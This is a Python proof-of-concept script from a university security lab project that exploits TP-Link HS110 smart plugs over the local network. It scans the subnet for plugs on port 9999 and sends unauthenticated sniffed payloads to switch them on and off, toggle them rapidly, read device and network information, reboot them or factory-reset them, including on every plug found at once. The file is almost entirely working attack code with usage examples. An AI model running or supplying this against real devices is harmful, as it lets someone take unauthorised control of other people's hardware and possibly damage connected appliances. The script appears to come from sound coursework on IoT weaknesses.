'''
ECE419/CS460 Security Lab Project
Rishov Dutta (rsdutta2), Daniel Zhang (dzhang54)

This is proof-of-concept code to exploit the TP-Link HS110 Smart plug 
by sending arbitrary commands to the plug without authentication nor
through the given app. This code can only be used locally, and can be 
used on one or more plugs. The code can also detect all smart plugs on
the network.

Notes:
To improve performance on scan operations, used multithreading to access
128 ip's at once. Ran this for two batches to target a total of 256 ip's.
Increased speed of scan ~128x since no longer sequential for 256 iterations.

Refer to the report for more details.

This code should not be used to exploit anyone's plugs whatsoever.
'''



 
import socket
import time
import argparse
from threading import Thread


#runs specified command to target ip on port 9999 by sending tcp packets with payload collected from sniffing
#see report for how commands were gathered
def run_cmd(command_input, ip):
	try:
		socket.setdefaulttimeout(1)
		command = cmd[command_input.lower()]
		connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		connection.connect((ip, 9999))
		connection.send(command.decode('hex'))
		response = connection.recv(2048)
		if command_input.lower() not in ['on', 'off']:
			print ('{{{}'.format(decrypt_response(response)))
		connection.close()
	except Exception as e:
		print ('Could not run command on smart plug')
		print (e)
		connection.close()

#toggles plug at specified ip on and off over a certain duration with constant interval
def toggle_on_off(duration, rest, ip):
	start_time = time.time()
	try:
		while time.time() - start_time < duration:
			run_cmd('on', ip)
			time.sleep(rest)
			run_cmd('off', ip)
			time.sleep(rest)
	except Exception as e:
		print ('Could not run toggle for duration')
		print (e)

#scans entire network for plugs in parallel (had issues spawning 256 threads at once, so did 2 batches of 128)
def ip_scan():
	try:
		current_hostname = socket.gethostbyname(socket.gethostname())
		subnet_name = current_hostname[:current_hostname.rfind('.') + 1]
	except Exception as e:
		print ('No network found')
		print (e)
		return

	found_plugs = {0:[], 1:[]}
	threads = []
	for i in range(128):
		t = Thread(target=check_ip, args=('{}{}'.format(subnet_name, i), found_plugs))
		threads.append(t)
	for i in threads:
		i.start()
	for i in threads:
		i.join()

	threads = []
	for i in range(128, 256):
		t = Thread(target=check_ip, args=('{}{}'.format(subnet_name, i), found_plugs))
		threads.append(t)
	for i in threads:
		i.start()
	for i in threads:
		i.join()
	
	if len(found_plugs) > 0:
		print ('Found plugs at {}'.format(found_plugs[1]))
		return found_plugs[1]

#function to check individual ip if it is plug
def check_ip(ip, found_plugs):
	socket.setdefaulttimeout(.1)
	connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connection.connect_ex((ip, 9999))
	try:
		connection.send('0000'.decode('hex'))
		connection.recv(1024)
		found_plugs[1].append(ip)
		connection.close()
	except Exception as e:
		found_plugs[0].append(ip)
		connection.close()
	

#TP-Link encryption algorithm as specified in report
def decrypt_response(string):
	key = 171
	result = ''
	for i in string:
		a = key ^ ord(i)
		key = ord(i)
		result += chr(a)
	return result[5:]


'''
Code usage instructions

-ip flag to specify specify ip of plug
-s flag to scan network for possible buld ip's
-c flag to specify commands from command list (use -h for full list)
-t flag for toggling for specific duration and intervals

example commands

python plug_attacks.py -ip 192.168.1.100 -c on: Turns plug at specified ip on

python plug_attacks.py -ip 192.168.1.100 -t 3 .5: toggles plug at specified ip on and off for 3 seconds at .5 second intervals

python plug_attacks.py -s: scans networks for all plugs

python plug_attacks.py -s -c on: scans network for all plugs and turns them all on

python plug_attacks.py -s -t 3 .5: toggles all plugs on network on and off for 3 seconds at .5 second intervals


'''

if __name__ == "__main__":
	cmd = {'on': '00000066d0f281f88bff9af7d5ef94b6c5a0d48bf99cf091e8b7c4b0d1a5c0e2d8a381f286e793f6d4eedfa2dff3d1b2ddb3c7a2daae8cb6cdef9cf386f497f2d0eac8aac9acc8fc99fccfe281e7d2e6cbffc8fec9e4ddeddfbe93a792f091f3c5f6c7f4c2a196b4c9b4',
			'off': '00000066d0f281f88bff9af7d5ef94b6c5a0d48bf99cf091e8b7c4b0d1a5c0e2d8a381f286e793f6d4eedea3def2d0b3dcb2c6a3dbaf8db7ccee9df287f596f3d1ebc9abc8adc9fd98fdcee380e6d3e7cafec9ffc8e5dcecdebf92a693f190f2c4f7c6f5c3a097b5c8b5',
			'info': '0000001dd0f281f88bff9af7d5ef94b6d1b4c09fec95e68fe187e8caf08bf68bf6',
			'nearby-networks': '00000028d0f29cf98de482a09ae1c3a4c1b5ea99fa9bf59cf294fbd9e398bac8adcbb9dcafc7e5dfef92ef92',
			'schedule': '0000001dd0f281e28aef8bfe92f7d5ef94b6d1b4c09fed98f491e2c0fa81fc81fc',
			'energy': '0000001ed0f297fa9feb8efcdee49fbddabfcb94e683e28efa93fe9bb983f885f885',
			'reboot': '00000021d0f281f88bff9af7d5ef94b6c4a1c3acc3b795afd4f692f79bfa83a19baad7aad7',
			'factory-reset': '00000020d0f281f88bff9af7d5ef94b6c4a1d2b7c3e1dba082e683ef8ef7d5efdea3dea3'}
	parser = argparse.ArgumentParser(description='CS460 Final Project TP-Link Smart Plug Exploits')
	ip_or_scan = parser.add_mutually_exclusive_group(required=True)
	ip_or_scan.add_argument('-ip', '--smart-plug-ip', dest='ip', metavar='<smart plug ip address>', help='Smart Plug IP address (192.168.X.Y, 10.0.0.X , etc)')
	ip_or_scan.add_argument('-s', '--scan', action='store_true', dest='scan', help='Scan for smart plugs')
	cmd_or_toggle = parser.add_mutually_exclusive_group(required=False)
	cmd_or_toggle.add_argument('-c', '--command', metavar='<command>', help='Command choices are: {}'.format([keys for keys in cmd]))
	cmd_or_toggle.add_argument('-t', '--toggle', nargs=2, dest='toggle', metavar=('<duration', 'interval>'), help='Toggle on and off, supply duration then interval (both in seconds)')
	args = parser.parse_args()

	if args.ip and (args.command is None and args.toggle is None):
	    parser.error('-ip/--smart-plug-ip requires -c/--command or -t/--toggle')

	if args.ip:
		if args.command:
			run_cmd(args.command, args.ip)
		else:
			toggle_on_off(float(args.toggle[0]), float(args.toggle[1]), args.ip)
	else:
		plugs = ip_scan()
		threads = []
		for plug in plugs:
			if args.command:
				threads.append(Thread(target=run_cmd, args=(args.command, plug)))
			elif args.toggle:
				threads.append(Thread(target=toggle_on_off, args=(float(args.toggle[0]), float(args.toggle[1]), plug)))
		for i in threads:
			i.start()
		for i in threads:
			i.join()
		if args.command or args.toggle:
			print ('Ran specified operation on plugs at {}'.format(plugs))



